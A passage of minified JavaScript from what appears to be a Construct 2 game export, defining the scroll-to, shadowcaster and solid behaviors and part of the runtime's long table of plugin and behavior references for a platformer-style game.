t=cr.behaviors.scrollto.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}e.onCreate=function(){this.enabled=0!==this.properties[0]},e.saveToJSON=function(){return{smg:this.behavior.shakeMag,ss:this.behavior.shakeStart,se:this.behavior.shakeEnd,smd:this.behavior.shakeMode}},e.loadFromJSON=function(t){this.behavior.shakeMag=t.smg,this.behavior.shakeStart=t.ss,this.behavior.shakeEnd=t.se,this.behavior.shakeMode=t.smd},e.tick=function(){},e.tick2=function(){if(this.enabled){for(var t,e=this.behavior.my_instances.valuesRef(),i=0,s=0,n=0,r=0,o=e.length;r<o;r++)(t=function(t){for(var e,i=0,s=t.behavior_insts.length;i<s;++i)if((e=t.behavior_insts[i]).behavior instanceof cr.behaviors.scrollto)return e;return null}(e[r]))&&t.enabled&&(i+=e[r].x,s+=e[r].y,++n);var a,h=this.inst.layer.layout,c=this.runtime.kahanTime.sum,l=0,u=0;c>=this.behavior.shakeStart&&c<this.behavior.shakeEnd&&(a=this.behavior.shakeMag*Math.min(this.runtime.timescale,1),0===this.behavior.shakeMode&&(a*=1-(c-this.behavior.shakeStart)/(this.behavior.shakeEnd-this.behavior.shakeStart)),c=Math.random()*Math.PI*2,a=Math.random()*a,l=Math.cos(c)*a,u=Math.sin(c)*a),h.scrollToX(i/n+l),h.scrollToY(s/n+u)}},i.prototype.Shake=function(t,e,i){this.behavior.shakeMag=t,this.behavior.shakeStart=this.runtime.kahanTime.sum,this.behavior.shakeEnd=this.behavior.shakeStart+e,this.behavior.shakeMode=i},i.prototype.SetEnabled=function(t){this.enabled=0!==t},t.acts=new i}(),cr.behaviors.shadowcaster=function(t){this.runtime=t,this.myTypes=[]},function(){var t=cr.behaviors.shadowcaster.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime,-1===this.behavior.myTypes.indexOf(e)&&this.behavior.myTypes.push(e)},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.inst.extra.shadowcasterEnabled=0!==this.properties[0],this.inst.extra.shadowcasterHeight=this.properties[1],this.inst.extra.shadowcasterTag=this.properties[2]},e.tick=function(){},i.prototype.IsEnabled=function(){return this.inst.extra.shadowcasterEnabled},i.prototype.CompareHeight=function(t,e){var i=this.inst.extra.shadowcasterHeight;return cr.do_cmp(i,t,e)},t.cnds=new i,s.prototype.SetEnabled=function(t){this.inst.extra.shadowcasterEnabled=!!t},s.prototype.SetHeight=function(t){this.inst.extra.shadowcasterHeight!==t&&(this.inst.extra.shadowcasterHeight=t,this.runtime.redraw=!0)},s.prototype.SetTag=function(t){this.inst.extra.shadowcasterTag!==t&&(this.inst.extra.shadowcasterTag=t,this.runtime.redraw=!0)},t.acts=new s,n.prototype.Height=function(t){t.set_float(this.inst.extra.shadowcasterHeight)},n.prototype.Tag=function(t){t.set_string(this.inst.extra.shadowcasterTag)},t.exps=new n}(),cr.behaviors.solid=function(t){this.runtime=t},function(){var t=cr.behaviors.solid.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.inst.extra.solidEnabled=0!==this.properties[0]},e.tick=function(){},i.prototype.IsEnabled=function(){return this.inst.extra.solidEnabled},t.cnds=new i,s.prototype.SetEnabled=function(t){this.inst.extra.solidEnabled=!!t},t.acts=new s}(),cr.getObjectRefTable=function(){return[cr.plugins_.NinePatch,cr.plugins_.AJAX,cr.plugins_.Audio,cr.plugins_.Arr,cr.plugins_.Function,cr.plugins_.Browser,cr.plugins_.Button,cr.plugins_.filechooser,cr.plugins_.Keyboard,cr.plugins_.gamepad,cr.plugins_.NodeWebkit,cr.plugins_.Mouse,cr.plugins_.LocalStorage,cr.plugins_.Touch,cr.plugins_.TextBox,cr.plugins_.Particles,cr.plugins_.aekiro_model,cr.plugins_.aekiro_proui2,cr.plugins_.TiledBg,cr.plugins_.Sprite,cr.plugins_.Text,cr.plugins_.c2canvas,cr.plugins_.GameAnalytics,cr.plugins_.Globals,cr.plugins_.CSS_import,cr.plugins_.hmmg_layoutTransition_v2,cr.plugins_.jcw_trace,cr.plugins_.JSON,cr.plugins_.HTML_Div_Pode,cr.plugins_.MagiCam,cr.plugins_.rojoPaster,cr.plugins_.sirg_notifications,cr.plugins_.TR_ClockParser,cr.plugins_.skymen_minifunctioncallback,cr.plugins_.skymen_siteLock,cr.plugins_.SkymenSFPlusPLus,cr.plugins_.skymen_skinsCore,cr.plugins_.TextModded,cr.plugins_.SyncStorage,cr.plugins_.TR_AdBlockDetector,cr.plugins_.ValerypopoffJSPlugin,cr.plugins_.skymenhowlerjs,cr.behaviors.Platform,cr.behaviors.Timer,cr.behaviors.Rex_pushOutSolid,cr.behaviors.LOS,cr.behaviors.jumpthru,cr.behaviors.solid,cr.behaviors.Persist,cr.behaviors.Rex_Zigzag,cr.behaviors.SkymenPolarCoordinates,cr.behaviors.shadowcaster,cr.behaviors.Bullet,cr.behaviors.Turret,cr.behaviors.Fade,cr.behaviors.Anchor,cr.behaviors.aekiro_button,cr.behaviors.aekiro_tag,cr.behaviors.aekiro_gameobject2,cr.behaviors.Sin,cr.behaviors.aekiro_bind,cr.behaviors.aekiro_gridView,cr.behaviors.aekiro_modelB,cr.behaviors.aekiro_scrollView,cr.behaviors.aekiro_dialog,cr.behaviors.aekiro_checkbox,cr.behaviors.aekiro_sliderbar,cr.behaviors.lunarray_Tween,cr.behaviors.scrollto,cr.behaviors.lunarray_LiteTween,cr.behaviors.SkymenSkin,cr.behaviors.SkymenPin,cr.system_object.prototype.cnds.IsGroupActive,cr.plugins_.Sprite.prototype.cnds.CompareInstanceVar,cr.behaviors.solid.prototype.acts.SetEnabled,cr.system_object.prototype.cnds.Else,cr.plugins_.Sprite.prototype.cnds.IsOverlapping,cr.plugins_.Sprite.prototype.cnds.IsBoolInstanceVarSet,cr.plugins_.Sprite.prototype.acts.AddInstanceVar,cr.system_object.prototype.exps.dt,cr.plugins_.Function.prototype.acts.CallFunction,cr.plugins_.Sprite.prototype.acts.Destroy,cr.plugins_.Sprite.prototype.acts.SetInstanceVar,cr.plugins_.Sprite.prototype.cnds.OnCollision,cr.behaviors.Platform.prototype.acts.SetVectorY,cr.behaviors.Platform.prototype.exps.Gravity,cr.system_object.prototype.exps.sin,cr.plugins_.Sprite.prototype.exps.Angle,cr.behaviors.Platform.prototype.acts.SetMaxSpeed,cr.system_object.prototype.exps.max,cr.system_object.prototype.exps.cos,cr.behaviors.Platform.prototype.acts.SetVectorX,cr.behaviors.Platform.prototype.exps.VectorX,cr.plugins_.skymenhowlerjs.prototype.acts.Play,cr.behaviors.Platform.prototype.acts.SetDeceleration,cr.behaviors.Bullet.prototype.acts.SetAngleOfMotion,cr.behaviors.Bullet.prototype.acts.SetSpeed,cr.behaviors.Bullet.prototype.exps.Gravity,cr.system_object.prototype.cnds.OnLayoutStart,cr.system_object.prototype.acts.Wait,cr.system_object.prototype.cnds.CompareVar,cr.system_object.prototype.acts.SetVar,cr.system_object.prototype.cnds.TriggerOnce,cr.plugins_.GameAnalytics.prototype.acts.addProgressionEvent,cr.system_object.prototype.exps.layoutname,cr.system_object.prototype.exps.int,cr.system_object.prototype.exps.tokenat,cr.plugins_.Globals.prototype.cnds.IsBoolInstanceVarSet,cr.plugins_.Globals.prototype.cnds.CompareInstanceVar,cr.system_object.prototype.cnds.IsPreview,cr.system_object.prototype.cnds.IsOnPlatform,cr.plugins_.SyncStorage.prototype.acts.SetData,cr.plugins_.SyncStorage.prototype.exps.Get,cr.plugins_.SyncStorage.prototype.acts.SaveData,cr.plugins_.Sprite.prototype.acts.SetBoolInstanceVar,cr.plugins_.Sprite.prototype.acts.SetAnimFrame,cr.plugins_.Sprite.prototype.cnds.IsVisible,cr.system_object.prototype.cnds.ForEach,cr.behaviors.SkymenPin.prototype.acts.Pin,cr.behaviors.Rex_Zigzag.prototype.acts.Start,cr.plugins_.Sprite.prototype.acts.SetPos,cr.plugins_.Sprite.prototype.exps.X,cr.plugins_.Sprite.prototype.exps.Y,cr.plugins_.Sprite.prototype.acts.SetAngle,cr.plugins_.Sprite.prototype.exps.UID,cr.system_object.prototype.cnds.PickAll,cr.plugins_.Sprite.prototype.cnds.PickByUID,cr.system_object.prototype.cnds.Compare,cr.behaviors.Rex_Zigzag.prototype.acts.SetAbsolute,cr.behaviors.SkymenPolarCoordinates.prototype.acts.SetEnabled,cr.plugins_.Sprite.prototype.cnds.PickInstVarHiLow,cr.behaviors.SkymenPolarCoordinates.prototype.acts.SetOriginPos,cr.system_object.prototype.exps.distance,cr.system_object.prototype.exps.angle,cr.behaviors.SkymenPolarCoordinates.prototype.acts.SetDeltaPos,cr.behaviors.Rex_Zigzag.prototype.exps.OffX,cr.behaviors.Rex_Zigzag.prototype.exps.OffY,cr.behaviors.Rex_Zigzag.prototype.exps.OffAngle,cr.behaviors.jumpthru.prototype.acts.SetEnabled,cr.behaviors.Turret.prototype.acts.AddTarget,cr.behaviors.Turret.prototype.cnds.OnShoot,cr.plugins_.Sprite.prototype.acts.Spawn,cr.plugins_.Sprite.prototype.exps.LayerName,cr.behaviors.Bullet.prototype.exps.Speed,cr.behaviors.LOS.prototype.cnds.HasLOSToObject,cr.behaviors.Turret.prototype.acts.SetEnabled,cr.system_object.prototype.cnds.EveryTick,cr.plugins_.Sprite.prototype.acts.RotateTowardPosition,cr.plugins_.Sprite.prototype.cnds.OnDestroyed,cr.plugins_.SyncStorage.prototype.cnds.HasData,cr.plugins_.Sprite.prototype.acts.SetOpacity,cr.behaviors.Bullet.prototype.cnds.CompareTravelled,cr.behaviors.Bullet.prototype.acts.SetEnabled,cr.behaviors.Fade.prototype.acts.StartFade,cr.system_object.prototype.cnds.PickByComparison,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetText,cr.plugins_.Sprite.prototype.acts.SetMirrored,cr.plugins_.Sprite.prototype.cnds.IsOverlappingOffset,cr.behaviors.Platform.prototype.exps.VectorY,cr.plugins_.Sprite.prototype.cnds.PickDistance,cr.plugins_.Function.prototype.exps.Call,cr.plugins_.Sprite.prototype.acts.SetCollisions,cr.behaviors.Platform.prototype.exps.Speed,cr.behaviors.Platform.prototype.exps.MovingAngle,cr.plugins_.Sprite.prototype.exps.ImagePointX,cr.plugins_.Sprite.prototype.exps.ImagePointY,cr.plugins_.Sprite.prototype.acts.SetY,cr.behaviors.Bullet.prototype.exps.AngleOfMotion,cr.plugins_.Sprite.prototype.cnds.IsCollisionEnabled,cr.plugins_.Function.prototype.cnds.OnFunction,cr.plugins_.Function.prototype.exps.Param,cr.plugins_.Function.prototype.acts.SetReturnValue,cr.behaviors.Timer.prototype.cnds.OnTimer,cr.behaviors.Platform.prototype.exps.GravityAngle,cr.behaviors.Platform.prototype.acts.SetGravityAngle,cr.plugins_.TiledBg.prototype.exps.Angle,cr.system_object.prototype.exps.anglediff,cr.behaviors.Timer.prototype.acts.StartTimer,cr.plugins_.Sprite.prototype.acts.SetSize,cr.plugins_.Sprite.prototype.acts.SetTowardPosition,cr.system_object.prototype.cnds.ForEachOrdered,cr.plugins_.Sprite.prototype.acts.ZMoveToObject,cr.behaviors.SkymenSkin.prototype.acts.UseDefault,cr.behaviors.SkymenSkin.prototype.acts.SetSkin,cr.behaviors.SkymenSkin.prototype.acts.HideDefault,cr.plugins_.Sprite.prototype.exps.Width,cr.plugins_.Sprite.prototype.exps.ImageWidth,cr.plugins_.Sprite.prototype.exps.Height,cr.plugins_.Sprite.prototype.exps.ImageHeight,cr.system_object.prototype.exps.find,cr.plugins_.MagiCam.prototype.acts.CreateLocalCamera,cr.plugins_.MagiCam.prototype.acts.FollowObject,cr.plugins_.MagiCam.prototype.acts.EnableFollowing,cr.plugins_.MagiCam.prototype.acts.SetFollowLag,cr.system_object.prototype.acts.Scroll,cr.system_object.prototype.exps.windowwidth,cr.system_object.prototype.exps.windowheight,cr.plugins_.Globals.prototype.acts.SetBoolInstanceVar,cr.plugins_.Browser.prototype.acts.ExecJs,cr.plugins_.Sprite.prototype.cnds.IsOutsideLayout,cr.behaviors.Bullet.prototype.acts.SetAcceleration,cr.behaviors.Fade.prototype.exps.FadeOutTime,cr.behaviors.Platform.prototype.acts.SetEnabled,cr.system_object.prototype.acts.RestartLayout,cr.behaviors.Platform.prototype.cnds.IsFalling,cr.behaviors.Platform.prototype.cnds.IsByWall,cr.behaviors.Platform.prototype.cnds.OnJump,cr.behaviors.Platform.prototype.exps.MaxSpeed,cr.behaviors.Platform.prototype.exps.JumpStrength,cr.behaviors.Platform.prototype.cnds.IsOnFloor,cr.behaviors.Platform.prototype.acts.SetIgnoreInput,cr.behaviors.Platform.prototype.cnds.IsMoving,cr.system_object.prototype.exps.time,cr.system_object.prototype.acts.AddVar,cr.behaviors.Platform.prototype.cnds.IsJumping,cr.behaviors.solid.prototype.cnds.IsEnabled,cr.behaviors.Rex_pushOutSolid.prototype.acts.SetEnabled,cr.behaviors.Rex_pushOutSolid.prototype.acts.PushOutNearest,cr.plugins_.jcw_trace.prototype.acts.TraceLine,cr.plugins_.jcw_trace.prototype.cnds.Hit,cr.plugins_.jcw_trace.prototype.exps.NormalAngle,cr.system_object.prototype.cnds.CompareBetween,cr.plugins_.Text.prototype.acts.SetText,cr.behaviors.Platform.prototype.cnds.CompareSpeed,cr.system_object.prototype.exps.abs,cr.system_object.prototype.exps.anglelerp,cr.system_object.prototype.exps.timescale,cr.plugins_.Keyboard.prototype.cnds.OnKeyCode,cr.plugins_.Touch.prototype.cnds.OnTouchObject,cr.plugins_.gamepad.prototype.cnds.OnButtonDown,cr.system_object.prototype.cnds.IsMobile,cr.plugins_.Browser.prototype.acts.Vibrate,cr.plugins_.Touch.prototype.cnds.IsTouchingObject,cr.plugins_.gamepad.prototype.cnds.CompareAxis,cr.plugins_.Keyboard.prototype.cnds.OnKeyCodeReleased,cr.plugins_.gamepad.prototype.cnds.OnButtonUp,cr.plugins_.Arr.prototype.cnds.CompareSize,cr.system_object.prototype.cnds.Repeat,cr.plugins_.Arr.prototype.acts.Push,cr.plugins_.Arr.prototype.acts.SetSize,cr.behaviors.Platform.prototype.acts.SimulateControl,cr.system_object.prototype.cnds.Every,cr.plugins_.Arr.prototype.exps.At,cr.plugins_.Arr.prototype.acts.Pop,cr.behaviors.Timer.prototype.acts.StopTimer,cr.plugins_.Sprite.prototype.acts.SetAnim,cr.plugins_.Sprite.prototype.cnds.IsAnimPlaying,cr.behaviors.Platform.prototype.acts.SetMaxFallSpeed,cr.plugins_.MagiCam.prototype.acts.ShakeCamera,cr.plugins_.Sprite.prototype.cnds.IsBetweenAngles,cr.behaviors.Platform.prototype.cnds.OnLand,cr.plugins_.Arr.prototype.exps.Width,cr.system_object.prototype.cnds.While,cr.system_object.prototype.acts.SubVar,cr.plugins_.Sprite.prototype.cnds.CompareX,cr.plugins_.Sprite.prototype.cnds.CompareY,cr.plugins_.Sprite.prototype.cnds.OnCreated,cr.plugins_.Arr.prototype.acts.JSONLoad,cr.plugins_.Arr.prototype.cnds.CompareXY,cr.plugins_.Sprite.prototype.acts.SetPosToObject,cr.system_object.prototype.exps.lerp,cr.plugins_.Sprite.prototype.acts.SetHeight,cr.plugins_.SkymenSFPlusPLus.prototype.acts.MoveToBottom,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetOpacity,cr.behaviors.Platform.prototype.acts.SetDoubleJumpEnabled,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Count,cr.system_object.prototype.acts.CreateObject,cr.plugins_.SkymenSFPlusPLus.prototype.exps.LayerName,cr.plugins_.SkymenSFPlusPLus.prototype.exps.X,cr.plugins_.SkymenSFPlusPLus.prototype.exps.BBoxBottom,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetSize,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Width,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetPos,cr.plugins_.SkymenSFPlusPLus.prototype.acts.MoveToLayer,cr.system_object.prototype.acts.SetGroupActive,cr.plugins_.TiledBg.prototype.acts.SetSize,cr.system_object.prototype.exps.layoutwidth,cr.plugins_.TiledBg.prototype.acts.MoveToBottom,cr.plugins_.TiledBg.prototype.acts.SetOpacity,cr.system_object.prototype.exps.layoutheight,cr.plugins_.TiledBg.prototype.acts.SetAngle,cr.plugins_.Browser.prototype.exps.Domain,cr.plugins_.ValerypopoffJSPlugin.prototype.exps.JSCodeValue,cr.behaviors.aekiro_dialog.prototype.acts.Open,cr.plugins_.Keyboard.prototype.cnds.OnKey,cr.plugins_.Browser.prototype.acts.ConsoleLog,cr.plugins_.SkymenSFPlusPLus.prototype.cnds.OnCreated,cr.plugins_.Browser.prototype.cnds.OnPageHidden,cr.plugins_.ValerypopoffJSPlugin.prototype.acts.ExecuteJSWithParams,cr.plugins_.Browser.prototype.cnds.OnPageVisible,cr.plugins_.skymenhowlerjs.prototype.cnds.IsPlaying,cr.plugins_.skymenhowlerjs.prototype.acts.PlayByName,cr.plugins_.skymenhowlerjs.prototype.acts.Mute,cr.plugins_.SyncStorage.prototype.cnds.IsLoaded,cr.plugins_.skymenhowlerjs.prototype.acts.LinearVolume,cr.plugins_.SyncStorage.prototype.cnds.CompareData,cr.plugins_.skymenhowlerjs.prototype.acts.Unmute,cr.system_object.prototype.exps.choose,cr.system_object.prototype.exps.str,cr.system_object.prototype.exps.floor,cr.system_object.prototype.exps.random,cr.plugins_.skymenhowlerjs.prototype.acts.Stop,cr.plugins_.Sprite.prototype.cnds.AngleWithin,cr.plugins_.JSON.prototype.cnds.IsEmpty,cr.plugins_.AJAX.prototype.acts.RequestFile,cr.plugins_.AJAX.prototype.cnds.OnComplete,cr.plugins_.JSON.prototype.acts.LoadJSON,cr.plugins_.AJAX.prototype.exps.LastData,cr.plugins_.aekiro_model.prototype.acts.SetJSONByKeyString,cr.plugins_.skymen_minifunctioncallback.prototype.acts.Callback,cr.plugins_.JSON.prototype.exps.Value,cr.plugins_.ValerypopoffJSPlugin.prototype.acts.Call,cr.plugins_.ValerypopoffJSPlugin.prototype.exps.StoredReturnValue,cr.plugins_.SyncStorage.prototype.acts.LoadData,cr.plugins_.skymenhowlerjs.prototype.acts.Load,cr.system_object.prototype.acts.WaitForSignal,cr.plugins_.Globals.prototype.acts.SetInstanceVar,cr.plugins_.Globals.prototype.exps.GetVariablesAsJSON,cr.plugins_.ValerypopoffJSPlugin.prototype.acts.SetValue,cr.plugins_.AJAX.prototype.cnds.OnError,cr.plugins_.SyncStorage.prototype.cnds.OnDataMissing,cr.plugins_.SyncStorage.prototype.cnds.OnLoaded,cr.plugins_.Globals.prototype.acts.LoadVariables,cr.plugins_.skymenhowlerjs.prototype.acts.Volume,cr.plugins_.skymenhowlerjs.prototype.exps.LinearVolume,cr.plugins_.Browser.prototype.acts.RequestFullScreen,cr.plugins_.SyncStorage.prototype.cnds.OnLoadError,cr.plugins_.SyncStorage.prototype.exps.ErrorMsg,cr.system_object.prototype.cnds.OnLayoutEnd,cr.plugins_.SyncStorage.prototype.acts.ClearData,cr.system_object.prototype.cnds.For,cr.plugins_.SyncStorage.prototype.acts.RemoveData,cr.system_object.prototype.exps.loopindex,cr.plugins_.SyncStorage.prototype.acts.AddValue,cr.plugins_.Browser.prototype.cnds.OnOfflineReady,cr.plugins_.Browser.prototype.cnds.OnUpdateFound,cr.plugins_.Browser.prototype.cnds.OnUpdateReady,cr.plugins_.sirg_notifications.prototype.cnds.OnNotificationClicked,cr.plugins_.Browser.prototype.acts.Reload,cr.plugins_.Browser.prototype.acts.GoToURLWindow,cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.didTransitionStart,cr.plugins_.sirg_notifications.prototype.acts.AddSimpleNotification,cr.plugins_.sirg_notifications.prototype.acts.AddNotification,cr.plugins_.sirg_notifications.prototype.acts.AddNotificationClickable,cr.plugins_.sirg_notifications.prototype.acts.DeleteAllNotifications,cr.plugins_.skymen_skinsCore.prototype.acts.AddSkin,cr.plugins_.skymen_skinsCore.prototype.acts.Init,cr.system_object.prototype.exps.clamp,cr.plugins_.Keyboard.prototype.cnds.OnAnyKey,cr.plugins_.Keyboard.prototype.exps.LastKeyCode,cr.plugins_.Sprite.prototype.exps.Count,cr.plugins_.NodeWebkit.prototype.acts.SetWindowTitle,cr.plugins_.Arr.prototype.acts.SetXY,cr.plugins_.Sprite.prototype.exps.AnimationFrame,cr.plugins_.NodeWebkit.prototype.acts.SetClipboardText,cr.plugins_.Arr.prototype.exps.AsJSON,cr.plugins_.Sprite.prototype.acts.SetVisible,cr.plugins_.skymen_skinsCore.prototype.exps.RandomSkin,cr.plugins_.Globals.prototype.acts.ToggleBoolInstanceVar,cr.plugins_.SyncStorage.prototype.exps.AsString,cr.plugins_.TextModded.prototype.cnds.OnCreated,cr.plugins_.TextModded.prototype.acts.SetInstanceVar,cr.plugins_.TextModded.prototype.exps.FaceSize,cr.plugins_.TextModded.prototype.exps.Width,cr.plugins_.TextModded.prototype.exps.Height,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetInstanceVar,cr.plugins_.SkymenSFPlusPLus.prototype.exps.CharacterScale,cr.plugins_.TextModded.prototype.acts.SetWebFont,cr.plugins_.SkymenSFPlusPLus.prototype.cnds.IsBoolInstanceVarSet,cr.plugins_.SkymenSFPlusPLus.prototype.cnds.IsVisible,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetVisible,cr.plugins_.ValerypopoffJSPlugin.prototype.cnds.CompareStoredReturnValue,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Text,cr.plugins_.SkymenSFPlusPLus.prototype.exps.LayerNumber,cr.behaviors.aekiro_gameobject2.prototype.exps.global,cr.plugins_.TextModded.prototype.acts.SetSize,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Height,cr.plugins_.TextModded.prototype.acts.SetText,cr.plugins_.TextModded.prototype.acts.SetFontSize,cr.plugins_.TextModded.prototype.acts.SetHorAl,cr.plugins_.TextModded.prototype.acts.SetVerAl,cr.plugins_.TextModded.prototype.acts.SetHeight,cr.plugins_.TextModded.prototype.acts.SetY,cr.plugins_.TextModded.prototype.exps.Y,cr.plugins_.TextModded.prototype.acts.SetWidth,cr.plugins_.TextModded.prototype.acts.SetX,cr.plugins_.TextModded.prototype.exps.X,cr.plugins_.TextModded.prototype.acts.SetAngle,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Angle,cr.plugins_.TextModded.prototype.acts.SetOpacity,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Opacity,cr.plugins_.TextModded.prototype.acts.ZMoveToObject,cr.plugins_.SkymenSFPlusPLus.prototype.cnds.CompareInstanceVar,cr.plugins_.TextModded.prototype.acts.SetFontColor,cr.system_object.prototype.exps.rgb,cr.plugins_.TextModded.prototype.acts.SetBoolInstanceVar,cr.plugins_.SkymenSFPlusPLus.prototype.exps.UID,cr.plugins_.SkymenSFPlusPLus.prototype.acts.Destroy,cr.system_object.prototype.acts.Signal,cr.system_object.prototype.exps.lowercase,cr.plugins_.Sprite.prototype.exps.AnimationName,cr.plugins_.Sprite.prototype.exps.LayerNumber,cr.plugins_.TextModded.prototype.acts.SetPos,cr.plugins_.Sprite.prototype.exps.Opacity,cr.plugins_.TextModded.prototype.exps.UID,cr.behaviors.aekiro_gameobject2.prototype.acts.AddChildrenFromType,cr.plugins_.TextModded.prototype.cnds.IsBoolInstanceVarSet,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetScale,cr.plugins_.SkymenSFPlusPLus.prototype.cnds.PickByUID,cr.plugins_.TextModded.prototype.cnds.PickByUID,cr.plugins_.aekiro_model.prototype.acts.StringToHashTable,cr.plugins_.TR_ClockParser.prototype.exps.MMSS,cr.system_object.prototype.exps.round,cr.system_object.prototype.exps.zeropad,cr.behaviors.aekiro_button.prototype.acts.setEnabled,cr.plugins_.aekiro_model.prototype.cnds.IsEmpty,cr.plugins_.Sprite.prototype.acts.SetX,cr.plugins_.Sprite.prototype.acts.SetWidth,cr.behaviors.aekiro_gameobject2.prototype.exps.parent,cr.plugins_.Sprite.prototype.exps.BBoxRight,cr.system_object.prototype.exps.replace,cr.plugins_.AJAX.prototype.acts.Request,cr.plugins_.Text.prototype.cnds.OnCreated,cr.plugins_.Text.prototype.acts.SetWebFont,cr.behaviors.aekiro_dialog.prototype.cnds.onDialogOpened,cr.system_object.prototype.acts.SetObjectTimescale,cr.behaviors.aekiro_dialog.prototype.acts.Close,cr.behaviors.aekiro_button.prototype.cnds.OnClicked,cr.behaviors.aekiro_bind.prototype.exps.index,cr.plugins_.TR_AdBlockDetector.prototype.cnds.IsBlocking,cr.plugins_.GameAnalytics.prototype.acts.addDesignEvent,cr.plugins_.Function.prototype.exps.ParamCount,cr.system_object.prototype.acts.GoToLayoutByName,cr.system_object.prototype.acts.SetTimescale,cr.plugins_.hmmg_layoutTransition_v2.prototype.acts.prepareTransition,cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.isTransitionReady,cr.plugins_.hmmg_layoutTransition_v2.prototype.acts.startTransition,cr.system_object.prototype.acts.SetLayerVisible,cr.behaviors.lunarray_LiteTween.prototype.cnds.OnEnd,cr.behaviors.aekiro_button.prototype.cnds.IsEnabled,cr.plugins_.Sprite.prototype.cnds.CompareFrame,cr.plugins_.Sprite.prototype.cnds.CompareWidth,cr.plugins_.JSON.prototype.exps.Size,cr.behaviors.lunarray_LiteTween.prototype.acts.SetParameter,cr.behaviors.lunarray_LiteTween.prototype.acts.Start,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetPosToObject,cr.plugins_.Sprite.prototype.exps.BBoxLeft,cr.plugins_.Sprite.prototype.exps.BBoxTop,cr.system_object.prototype.exps.viewportright,cr.system_object.prototype.exps.viewportleft,cr.system_object.prototype.exps.viewportbottom,cr.system_object.prototype.exps.viewporttop,cr.system_object.prototype.acts.SetLayerOpacity,cr.system_object.prototype.exps.unlerp,cr.plugins_.Sprite.prototype.exps.BBoxBottom,cr.plugins_.Particles.prototype.acts.SetRate,cr.system_object.prototype.exps.canvastolayerx,cr.plugins_.Touch.prototype.exps.AbsoluteX,cr.plugins_.Touch.prototype.exps.AbsoluteY,cr.system_object.prototype.exps.canvastolayery,cr.plugins_.Mouse.prototype.cnds.OnObjectClicked,cr.plugins_.Mouse.prototype.exps.AbsoluteX,cr.plugins_.Mouse.prototype.exps.AbsoluteY,cr.plugins_.Mouse.prototype.cnds.IsOverObject,cr.behaviors.Sin.prototype.acts.SetMagnitude,cr.behaviors.Sin.prototype.exps.Magnitude,cr.behaviors.Sin.prototype.acts.SetPeriod,cr.behaviors.Sin.prototype.exps.Period,cr.behaviors.aekiro_dialog.prototype.cnds.onDialogClosed,cr.plugins_.TextModded.prototype.cnds.CompareInstanceVar,cr.plugins_.Keyboard.prototype.exps.StringFromKeyCode,cr.behaviors.aekiro_sliderbar.prototype.acts.setValue,cr.behaviors.aekiro_checkbox.prototype.acts.setValue,cr.plugins_.Browser.prototype.cnds.IsFullscreen,cr.behaviors.aekiro_checkbox.prototype.cnds.OnClicked,cr.behaviors.aekiro_checkbox.prototype.cnds.IsChecked,cr.plugins_.Browser.prototype.acts.CancelFullScreen,cr.behaviors.aekiro_sliderbar.prototype.cnds.IsSliding,cr.behaviors.aekiro_sliderbar.prototype.exps.value,cr.plugins_.rojoPaster.prototype.cnds.OnCreated,cr.plugins_.rojoPaster.prototype.acts.LoadImage,cr.plugins_.SkymenSFPlusPLus.prototype.exps.Y,cr.plugins_.TextModded.prototype.acts.Destroy,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetBoolInstanceVar,cr.plugins_.SyncStorage.prototype.acts.SubtractValue,cr.plugins_.Touch.prototype.cnds.OnDoubleTapGestureObject,cr.plugins_.Arr.prototype.acts.SetXYZ,cr.plugins_.Keyboard.prototype.cnds.IsKeyDown,cr.system_object.prototype.acts.GoToLayout,cr.system_object.prototype.acts.ResetPersisted,cr.behaviors.aekiro_dialog.prototype.cnds.isOpened,cr.plugins_.Function.prototype.cnds.CompareParam,cr.plugins_.HTML_Div_Pode.prototype.acts.MoveToLayer,cr.plugins_.Browser.prototype.cnds.IsPortraitLandscape,cr.plugins_.HTML_Div_Pode.prototype.acts.SetPos,cr.system_object.prototype.exps.originalwindowwidth,cr.plugins_.HTML_Div_Pode.prototype.acts.SetWidth,cr.plugins_.HTML_Div_Pode.prototype.acts.SetVisible,cr.plugins_.filechooser.prototype.acts.ReleaseFile,cr.plugins_.filechooser.prototype.exps.FileURLAt,cr.plugins_.Browser.prototype.acts.InvokeDownloadString,cr.plugins_.filechooser.prototype.cnds.OnChanged,cr.plugins_.TextBox.prototype.cnds.OnClicked,cr.plugins_.TextBox.prototype.acts.SetBlur,cr.plugins_.Button.prototype.cnds.OnClicked,cr.plugins_.Button.prototype.cnds.CompareInstanceVar,cr.plugins_.TextBox.prototype.cnds.CompareInstanceVar,cr.plugins_.TextBox.prototype.exps.Text,cr.plugins_.Button.prototype.cnds.IsChecked,cr.plugins_.SyncStorage.prototype.acts.AppendValue,cr.behaviors.Fade.prototype.acts.RestartFade,cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.didTransitionFinish,cr.behaviors.lunarray_Tween.prototype.cnds.OnEnd,cr.behaviors.lunarray_Tween.prototype.acts.SetParameter,cr.behaviors.